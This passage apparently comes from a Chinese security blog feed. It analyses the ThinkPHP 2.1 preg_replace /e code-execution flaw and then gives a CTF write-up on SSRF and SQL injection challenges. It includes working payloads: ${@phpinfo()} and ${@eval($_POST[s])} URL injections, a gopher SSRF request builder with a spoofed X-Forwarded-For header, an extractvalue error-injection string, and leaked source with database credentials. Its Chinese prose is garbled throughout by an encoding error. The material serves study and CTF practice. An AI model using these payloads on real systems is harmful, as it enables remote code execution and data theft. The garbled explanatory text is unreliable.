class="string">&#x27;,&#x27;</span>,strtolower(C(<span class="string">&#x27;APP_GROUP_DENY&#x27;</span>))))) &#123;</span><br><span class="line">                <span class="comment">// ç¦æ­¢ç›´æ¥è®¿é—®åˆ†ç»„</span></span><br><span class="line">                <span class="keyword">exit</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[C(<span class="string">&#x27;VAR_MODULE&#x27;</span>)])) &#123;<span class="comment">// è¿˜æ²¡æœ‰å®šä¹‰æ¨¡å—åç§°</span></span><br><span class="line">            <span class="variable">$var</span>[C(<span class="string">&#x27;VAR_MODULE&#x27;</span>)]  =   array_shift(<span class="variable">$paths</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$var</span>[C(<span class="string">&#x27;VAR_ACTION&#x27;</span>)]  =   array_shift(<span class="variable">$paths</span>);</span><br><span class="line">        <span class="comment">// è§£æå‰©ä½™çš„URLå‚æ•°</span></span><br><span class="line">        <span class="variable">$res</span> = preg_replace(<span class="string">&#x27;@(\w+)&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;([^&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;\/]+)@e&#x27;</span>, <span class="string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, implode(<span class="variable">$depr</span>,<span class="variable">$paths</span>));</span><br><span class="line">        <span class="variable">$_GET</span>   =  array_merge(<span class="variable">$var</span>,<span class="variable">$_GET</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–åˆ†ç»„ æ¨¡å—å’Œæ“ä½œåç§°</span></span><br><span class="line">    <span class="keyword">if</span> (C(<span class="string">&#x27;APP_GROUP_LIST&#x27;</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        define(<span class="string">&#x27;GROUP_NAME&#x27;</span>, <span class="built_in">self</span>::getGroup(C(<span class="string">&#x27;VAR_GROUP&#x27;</span>)));</span><br><span class="line">        <span class="comment">// åŠ è½½åˆ†ç»„é…ç½®æ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">if</span>(is_file(CONFIG_PATH.GROUP_NAME.<span class="string">&#x27;/config.php&#x27;</span>))</span><br><span class="line">            C(<span class="keyword">include</span> CONFIG_PATH.GROUP_NAME.<span class="string">&#x27;/config.php&#x27;</span>);</span><br><span class="line">        <span class="comment">// åŠ è½½åˆ†ç»„å‡½æ•°æ–‡ä»¶</span></span><br><span class="line">        <span class="keyword">if</span>(is_file(COMMON_PATH.GROUP_NAME.<span class="string">&#x27;/function.php&#x27;</span>))</span><br><span class="line">            <span class="keyword">include</span> COMMON_PATH.GROUP_NAME.<span class="string">&#x27;/function.php&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    define(<span class="string">&#x27;MODULE_NAME&#x27;</span>,<span class="built_in">self</span>::getModule(C(<span class="string">&#x27;VAR_MODULE&#x27;</span>)));</span><br><span class="line">    define(<span class="string">&#x27;ACTION_NAME&#x27;</span>,<span class="built_in">self</span>::getAction(C(<span class="string">&#x27;VAR_ACTION&#x27;</span>)));</span><br><span class="line">    <span class="comment">// URLå¸¸é‡</span></span><br><span class="line">    <span class="comment">// å½“å‰é¡µé¢åœ°å€</span></span><br><span class="line">    <span class="comment">//define(&#x27;__SELF__&#x27;,$_SERVER[&#x27;PHP_SELF&#x27;]);</span></span><br><span class="line">    define(<span class="string">&#x27;__SELF__&#x27;</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]);</span><br><span class="line">    define(<span class="string">&#x27;__INFO__&#x27;</span>,<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>]);</span><br><span class="line">    <span class="comment">// å½“å‰é¡¹ç›®åœ°å€</span></span><br><span class="line">    define(<span class="string">&#x27;__APP__&#x27;</span>,PHP_FILE);</span><br><span class="line">    <span class="comment">// å½“å‰æ¨¡å—å’Œåˆ†ç»„åœ°å€</span></span><br><span class="line">    <span class="variable">$module</span> = defined(<span class="string">&#x27;P_MODULE_NAME&#x27;</span>)?P_MODULE_NAME:MODULE_NAME;</span><br><span class="line">    <span class="keyword">if</span>(defined(<span class="string">&#x27;GROUP_NAME&#x27;</span>)) &#123;</span><br><span class="line">        <span class="variable">$group</span>   = C(<span class="string">&#x27;URL_CASE_INSENSITIVE&#x27;</span>) ?strtolower(GROUP_NAME):GROUP_NAME;</span><br><span class="line">        define(<span class="string">&#x27;__GROUP__&#x27;</span>,(!<span class="keyword">empty</span>(<span class="variable">$domainGroup</span>) || GROUP_NAME == C(<span class="string">&#x27;DEFAULT_GROUP&#x27;</span>) )?__APP__ : __APP__.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$group</span>);</span><br><span class="line">        define(<span class="string">&#x27;__URL__&#x27;</span>,!<span class="keyword">empty</span>(<span class="variable">$domainModule</span>)?__GROUP__.<span class="variable">$depr</span> : __GROUP__.<span class="variable">$depr</span>.<span class="variable">$module</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        define(<span class="string">&#x27;__URL__&#x27;</span>,!<span class="keyword">empty</span>(<span class="variable">$domainModule</span>)?__APP__.<span class="string">&#x27;/&#x27;</span> : __APP__.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$module</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å½“å‰æ“ä½œåœ°å€</span></span><br><span class="line">    define(<span class="string">&#x27;__ACTION__&#x27;</span>,__URL__.<span class="variable">$depr</span>.ACTION_NAME);</span><br><span class="line">    <span class="comment">//ä¿è¯$_REQUESTæ­£å¸¸å–å€¼</span></span><br><span class="line">    <span class="variable">$_REQUEST</span> = array_merge(<span class="variable">$_POST</span>,<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è·¯ç”±æ§åˆ¶è¿™å—é‡ç‚¹åº”è¯¥æ˜¯è¿™ä¸²ä»£ç ï¼Œæ‰€ä»¥é‡ç‚¹çœ‹ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (C(<span class="string">&#x27;APP_GROUP_LIST&#x27;</span>) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[C(<span class="string">&#x27;VAR_GROUP&#x27;</span>)]))&#123;</span><br><span class="line">                <span class="variable">$var</span>[C(<span class="string">&#x27;VAR_GROUP&#x27;</span>)] = in_array(strtolower(<span class="variable">$paths</span>[<span class="number">0</span>]),explode(<span class="string">&#x27;,&#x27;</span>,strtolower(C(<span class="string">&#x27;APP_GROUP_LIST&#x27;</span>))))? array_shift(<span class="variable">$paths</span>) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™ä¸€æ®µä»£ç æ˜¯å¯¹åˆ†ç»„è¿›è¡Œå¤„ç†é¦–å…ˆåˆ¤æ–­æ˜¯å¦æœ‰åˆ†ç»„ï¼Œé»˜è®¤æ˜¯å¦èƒ½ä»åˆ†ç»„è·å–å˜é‡ã€‚$paths=explode( $depr,trim( $_SERVER[â€˜PATH_INFOâ€™],â€™/â€˜)); $_SERVER[â€˜PATH_INFOâ€™]æ˜¯è¿”å›ç”¨æˆ·æŸ¥è¯¢è¯­å¥æŸ¥è¯¢çš„çœŸå®è„šæœ¬åé¢çš„urlçœŸå®è·¯å¾„<br>æ¯”å¦‚<a href="http://127.0.0.1/1/url.php/test/test/1.php?test=123%E8%BF%99%E7%A7%8D%E6%A0%BC%E5%BC%8F%E4%BC%9A%E8%BF%94%E5%9B%9Eurl.php%E5%90%8E%E9%9D%A2%E7%9A%84%E8%B7%AF%E5%BE%84%E4%B9%9F%E5%B0%B1%E6%98%AF/test/test/1.php%E3%80%82">http://127.0.0.1/1/url.php/test/test/1.php?test=123è¿™ç§æ ¼å¼ä¼šè¿”å›url.phpåé¢çš„è·¯å¾„ä¹Ÿå°±æ˜¯/test/test/1.phpã€‚</a><br>è€Œä¹‹å‰ $depr = C(â€˜URL_PATHINFO_DEPRâ€™); C(â€˜URL_PATHINFO_DEPRâ€™)æ˜¯PATHINFOæ¨¡å¼ä¸‹çš„åˆ†å‰²ç¬¦å·ã€‚</p><p>æ‰€ä»¥è¿™æ®µä»£ç æœ¬åœ°æµ‹è¯•äº†ä¸€ä¸‹ç»è¿‡exlodeå¤„ç†åä¸Šé¢é‚£æ®µurlçš„è¿”å›å€¼æ˜¯<br>Array ([0] =&gt; [1] =&gt; test [2] =&gt; test [3] =&gt; 1.php)<br>array_shiftæ˜¯å»é™¤æ•°ç»„çš„å¼€å¤´å•å…ƒã€‚é‚£ä¹ˆ$varæœ€åçš„å€¼æ˜¯å»é™¤äº†[0]è¿™å•å…ƒçš„æ•°ç»„æˆ–è€…ä¸ºç©ºã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$res</span> = preg_replace(<span class="string">&#x27;@(\w+)&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;([^&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;\/]+)@e&#x27;</span>, <span class="string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, implode(<span class="variable">$depr</span>,<span class="variable">$paths</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>  è¯¥ä»£ç å—é¦–å…ˆæ£€æµ‹è·¯ç”±è§„åˆ™ï¼Œå¦‚æœæ²¡æœ‰åˆ¶å®šè§„åˆ™åˆ™æŒ‰ç…§é»˜è®¤è§„åˆ™è¿›è¡ŒURLè°ƒåº¦ï¼Œåœ¨preg_replace()å‡½æ•°ä¸­ï¼Œæ­£åˆ™è¡¨è¾¾å¼ä¸­ä½¿ç”¨äº†/eæ¨¡å¼ï¼Œå°†â€œæ›¿æ¢å­—ç¬¦ä¸²â€ä½œä¸ºPHPä»£ç æ±‚å€¼ï¼Œå¹¶ç”¨å…¶ç»“æœæ¥æ›¿æ¢æ‰€æœç´¢çš„å­—ç¬¦ä¸²ã€‚<br>æ­£åˆ™è¡¨è¾¾å¼å¯ä»¥ç®€åŒ–ä¸ºâ€œ\w+/([^/])â€ï¼Œå³æœç´¢è·å–â€œ/â€å‰åçš„ä¸¤ä¸ªå‚æ•°ï¼Œ$var[â€˜\1â€™]=â€\2â€;æ˜¯å¯¹æ•°ç»„çš„æ“ä½œï¼Œå°†ä¹‹å‰æœç´¢åˆ°çš„ç¬¬ä¸€ä¸ªå€¼ä½œä¸ºæ–°æ•°ç»„çš„é”®ï¼Œå°†ç¬¬äºŒä¸ªå€¼ä½œä¸ºæ–°æ•°ç»„çš„å€¼ï¼Œæˆ‘ä»¬å‘ç°å¯ä»¥æ„é€ æœç´¢åˆ°çš„ç¬¬äºŒä¸ªå€¼ï¼Œå³å¯æ‰§è¡Œä»»æ„PHPä»£ç ï¼Œåœ¨PHPä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨${}é‡Œé¢å¯ä»¥æ‰§è¡Œå‡½æ•°ï¼Œç„¶åæˆ‘ä»¬åœ¨thinkphpçš„urlä¸­çš„å¶æ•°ä½ç½®ä½¿ç”¨${}æ ¼å¼çš„phpä»£ç ï¼Œå³å¯æœ€ç»ˆæ‰§è¡Œthinkphpä»»æ„ä»£ç æ‰§è¡Œæ¼æ´</p><p>è¿™ä¸€æ®µå°±æ˜¯thinkphp2.1å‘½ä»¤æ‰§è¡Œçš„é—®é¢˜æ‰€åœ¨äº†ï¼Œçœ‹çœ‹è¿™æ®µä»£ç åˆ°åº•åšäº†ä»€ä¹ˆã€‚<br>è¿™é‡Œå…¶å®æ˜¯å› ä¸ºpreg_replace \eä¿®é¥°ç¬¦çš„é—®é¢˜ï¼Œè¿™ä¸ªä¿®é¥°ç¬¦ä¼šæŠŠç¬¬äºŒä¸ªå‚æ•°å½“æˆphpä»£ç æ‰§è¡Œã€‚ç®€å•ç»“åˆä¸Šé¢çš„è¯­å¥æ¥è¯´å°±æ˜¯$ var[â€˜\1â€™]=â€\2â€;å®ƒæŠŠè¿™ä¸ªå½“æˆäº†ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œè€Œ1å’Œ2æ˜¯implode($ depr,$paths)æ‰§è¡Œç»“æœæ¥ä»£æ›¿ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$depr</span>=<span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="variable">$paths</span> = explode(<span class="variable">$depr</span>,trim(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PATH_INFO&#x27;</span>],<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line"><span class="variable">$var</span>=<span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$res</span>= preg_replace(<span class="string">&#x27;@(\w+)&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;([^&#x27;</span>.<span class="variable">$depr</span>.<span class="string">&#x27;\/]+)@e&#x27;</span>,<span class="string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, implode(<span class="variable">$depr</span>,<span class="variable">$paths</span>));</span><br><span class="line">print_r(<span class="variable">$var</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å½“è¾“å…¥<a href="http://127.0.0.1/html/1.php/module/%7B@phpinfo()%7D">http://127.0.0.1/html/1.php/module/%7B@phpinfo()%7D</a><br>è¿™ç§urlæ—¶ä¼šæ‰“å°å‡ºArray ( [module] =&gt; {@phpinfo()} )<br><img src="https://img-blog.csdnimg.cn/dc9d2872af2c4f8fa7090a795bbe7f50.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>å½“è¾“å…¥<a href="http://127.0.0.1/html/module/%7B@phpinfo()%7D%E6%97%B6%E4%BC%9A%E6%89%A7%E8%A1%8Cphpinfo()">http://127.0.0.1/html/module/{@phpinfo()}æ—¶ä¼šæ‰§è¡Œphpinfo()</a><br>æœ¬åœ°åšæµ‹è¯•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="string">&quot;$&#123;@phpinfo()&#125;;&quot;</span>,<span class="number">1</span>=&gt;<span class="string">&#x27;b&#x27;</span>,<span class="number">2</span>=&gt;<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line">    print_r(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°<br><img src="https://img-blog.csdnimg.cn/05453706db6c4348b058e94019cb5ded.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAWXVuWDFu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>è¿™æ ·å†™phpinfo()æ˜¯å¯ä»¥æ‰§è¡ŒæˆåŠŸçš„ã€‚ç„¶åæŠŠä¸­é—´çš„ä»£ç æ”¹æˆäº†<br>$ a=array(0=&gt;â€$ {@eval($_POST[s])};â€,1=&gt;â€™bâ€™,2=&gt;â€™câ€™)ã€‚<br>ä»”ç»†æƒ³æƒ³å…¶å®å› ä¸ºæ•°ç»„èµ‹å€¼çš„é—®é¢˜ï¼Œä½ ç”¨$æ ‡è¯†ä¸€ä¸ªå˜é‡ä¹‹åï¼Œä»–æ˜¯æŠŠå˜é‡çš„å€¼èµ‹ç»™0æ‰€ä»¥å°±ä¼šå¯¼è‡´æ‰§è¡Œã€‚</p><p>è€Œè¿™ä¸ªæ¼æ´çš„åˆ©ç”¨æ ¼å¼ä¸ºä»€ä¹ˆå¿…é¡»æ˜¯index.php/xxx/xxx/xxx/${@phpinfo()}<br>æ˜¯å› ä¸ºè¿™é‡Œè¿˜æ˜¯åœ¨è¿™ä¸ªæ–‡ä»¶ï¼Œ214åˆ°224è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$routes</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$route</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="number">0</span> === stripos(<span class="variable">$regx</span>.<span class="variable">$depr</span>,<span class="variable">$route</span>[<span class="number">0</span>].<span class="variable">$depr</span>)) &#123;</span><br><span class="line">                    <span class="comment">// ç®€å•è·¯ç”±å®šä¹‰ï¼šarray(&#x27;è·¯ç”±å®šä¹‰&#x27;,&#x27;åˆ†ç»„/æ¨¡å—/æ“ä½œå&#x27;, &#x27;è·¯ç”±å¯¹åº”å˜é‡&#x27;,&#x27;é¢å¤–å‚æ•°&#x27;),</span></span><br><span class="line">                    <span class="variable">$var</span>  =  <span class="built_in">self</span>::parseUrl(<span class="variable">$route</span>[<span class="number">1</span>]);</span><br><span class="line">                    <span class="comment">//  è·å–å½“å‰è·¯ç”±å‚æ•°å¯¹åº”çš„å˜é‡</span></span><br><span class="line">                    <span class="variable">$paths</span> = explode(<span class="variable">$depr</span>,trim(str_ireplace(<span class="variable">$route</span>[<span class="number">0</span>].<span class="variable">$depr</span>,<span class="variable">$depr</span>,<span class="variable">$regx</span>),<span class="variable">$depr</span>));</span><br><span class="line">                    <span class="variable">$vars</span>    =   explode(<span class="string">&#x27;,&#x27;</span>,<span class="variable">$route</span>[<span class="number">2</span>]);</span><br><span class="line">                    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;count(<span class="variable">$vars</span>);<span class="variable">$i</span>++)</span><br><span class="line">                        <span class="variable">$var</span>[<span class="variable">$vars</span>[<span class="variable">$i</span>]]     =   array_shift(<span class="variable">$paths</span>);</span><br><span class="line">                    <span class="comment">// è§£æå‰©ä½™çš„URLå‚æ•°</span></span><br><span class="line">                    <span class="variable">$res</span> = preg_replace(<span class="string">&#x27;@(\w+)\/([^,\/]+)@e&#x27;</span>, <span class="string">&#x27;$var[\&#x27;\\1\&#x27;]=&quot;\\2&quot;;&#x27;</span>, implode(<span class="string">&#x27;/&#x27;</span>,<span class="variable">$paths</span>));</span><br></pre></td></tr></table></figure><p>thinkphpè·¯ç”±çš„æ ¼å¼æ˜¯åˆ†ç»„/æ¨¡å—/æ“ä½œå/å‚æ•°ã€‚è€Œå‚æ•°æ˜¯è¢«å¸¦å…¥æ‰§è¡Œçš„ã€‚ä»¥è¿™ç§æ ¼å¼ä¼ å…¥çš„ä¼šæ‰§è¡Œå‘½ä»¤ã€‚</p><p><a href="https://www.cnblogs.com/wangshuwin/p/7607120.html">è½¬è½½è‡ªå¤§ä½¬åšå®¢</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬äºŒå±Šç½‘åˆƒæ¯webéƒ¨åˆ†</title>
      <link href="/2022/05/07/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AFweb/"/>
      <url>/2022/05/07/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E7%BD%91%E5%88%83%E6%9D%AFweb/</url>
      
        <content type="html"><![CDATA[<h2 id="Sign-in"><a href="#Sign-in" class="headerlink" title="Sign_in"></a>Sign_in</h2><p>ä¸€é“SSRF<br><img src="https://img-blog.csdnimg.cn/ebc028637faf45fc821017dd2db8fbf3.png"><br>çœ‹å¤§ä½¬åšå®¢å‘ç°æŸ¥çœ‹ç½‘ç»œæƒ…å†µ<br>ï¼ˆå­¦åˆ°äº†ï¼Œå­¦åˆ°äº†ï¼‰<br><img src="https://img-blog.csdnimg.cn/f3abe6f299b249cda5eb2675a46d06eb.png"><br>å‘ç°100è¿™ä¸ªipæœ‰ä¸åŒ<br>è®¿é—®<br><img src="https://img-blog.csdnimg.cn/dd10c285d71a402bbb3ea2c2509b2bf3.png"><br>éšä¾¿ä¼ è¿‡å»ä¸€ä¸ªaï¼Œbçœ‹å¤§ä½¬åšå®¢å‘ç°åˆ©ç”¨exp<br>(åˆ©ç”¨gopherå‘é€httpè¯·æ±‚)<br><a href="https://zhuanlan.zhihu.com/p/112055947">gopherè¯¦è§£</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line">payload =\</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">POST /?a=1 HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 172.73.23.100</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 3</span></span><br><span class="line"><span class="string">X-Forwarded-For: 127.0.0.1</span></span><br><span class="line"><span class="string">Referer: bolean.club</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">b=1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>  </span><br><span class="line">tmp = urllib.parse.quote(payload)<span class="comment">#å¯¹payloadè¿›è¡Œurlç¼–ç </span></span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;?url=gopher://172.73.26.100:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line"><span class="built_in">print</span>(result)       <span class="comment"># å› ä¸ºæ˜¯GETè¯·æ±‚æ‰€ä»¥è¦è¿›è¡Œä¸¤æ¬¡urlç¼–ç </span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°è·¯å¾„è®¿é—®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A//<span class="number">172.73</span><span class="number">.26</span><span class="number">.100</span>%3A80/_%250D%250APOST%<span class="number">2520</span>/%253Fa%253D1%2520HTTP/<span class="number">1.1</span>%250D%250AHost%253A%<span class="number">2520172.73</span><span class="number">.26</span><span class="number">.100</span>%250D%250AContent-<span class="type">Type</span>%253A%2520application/x-www-form-urlencoded%250D%250AContent-Length%253A%<span class="number">25203</span>%250D%250AX-Forwarded-For%253A%<span class="number">2520127.0</span><span class="number">.0</span><span class="number">.1</span>%250D%250AReferer%253A%2520bolean.club%250D%250A%250D%250Ab%253D1%250D%250A</span><br></pre></td></tr></table></figure><p>æœ€åå¾—åˆ°flag</p><h2 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h2><p>æ‰“å¼€é¢˜ç›®ï¼Œä¸Šä¼ æ–‡ä»¶ï¼Œå‘ç°phpæ— æ³•ä¸Šä¼ ï¼Œäºæ˜¯ä¸Šä¼ ä¸€ä¸ªtxtæ–‡ä»¶æŠ¥é”™<br><img src="https://img-blog.csdnimg.cn/4b19320c543d43aa8691bd3e717e2a24.png"><br>ä¿®æ”¹typeä¸ºctfä¸Šä¼ æˆåŠŸ<br>é¢˜ç›®æç¤ºä¸sqlæœ‰å…³ï¼Œå°è¯•åœ¨filenameåŠ ä¸ªå•å¼•å·ï¼ˆé€ä¸ªå°è¯•ï¼‰<br>å‘ç°æŠ¥é”™<br><img src="https://img-blog.csdnimg.cn/ff7c8e7c9c01499d9f5573a1bf6ca7c9.png"><br>æ¨æµ‹ä¸ºæŠ¥é”™æ³¨å…¥<br>å…ˆæŠ¥åº“</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span>(select extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select database()))))</span><br></pre></td></tr></table></figure><p>æ²¡æ˜¾ç¤ºï¼Œ<br><img src="https://img-blog.csdnimg.cn/4d5816c3bc794a75b7a07df68dc224c5.png"><br>æœ‰å›æ˜¾äº†<br><img src="https://img-blog.csdnimg.cn/0d270d618f0d43959a8540a4603edc7a.png"><br>æ¥ç€æŠ¥è¡¨ï¼ŒæŠ¥ç«¯<br>å‘ç°ä¸è¡Œï¼ˆç”±äºæ–‡ä»¶åå­—é•¿åº¦æœ‰é™åˆ¶ï¼‰<br>ç›²çŒœä¸€ä¸‹<br><img src="https://img-blog.csdnimg.cn/e77e9da6dd9a480c88093e46f6959049.png"><br>ä»…å‡ºç°ä¸€éƒ¨åˆ†ï¼Œåˆ©ç”¨substrå‡½æ•°<br><img src="https://img-blog.csdnimg.cn/044f4f4f4f1a4f748bde60dc7ea11cc1.png"><br>å¾—åˆ°flag<br>ç”±äºåœ¨è¿›è¡Œæ³¨å…¥æ—¶æ€»æ˜¯å¤šä¸€ä¸ªï¼‰ï¼Œçœ‹å¤§ä½¬åšå®¢å‘ç°<br>ä¸»é¡µæºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Ã§Â®â‚¬Ã¥Ââ€¢Ã¤Â¸Å Ã¤Â¼ &lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span> enctype=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;file&quot;</span> name=<span class="string">&quot;upfile&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;Ã¤Â¸Å Ã¤Â¼ &quot;</span>&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ini_set(<span class="string">&#x27;display_errors&#x27;</span>,<span class="number">1</span>);        </span><br><span class="line">    ini_set(<span class="string">&#x27;display_startup_errors&#x27;</span>,<span class="number">1</span>);</span><br><span class="line">    error_reporting(-<span class="number">1</span>);</span><br><span class="line">    <span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">    <span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="variable">$password</span> = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    <span class="variable">$dbname</span> = <span class="string">&quot;upload&quot;</span>;</span><br><span class="line">     </span><br><span class="line"></span><br><span class="line">    <span class="variable">$conn</span> = mysqli_connect(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>, <span class="variable">$dbname</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>))&#123;</span><br><span class="line">        <span class="variable">$filename_hz</span> = explode(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&#x27;upfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$name</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>, <span class="string">&#x27;jpeg&#x27;</span> ,<span 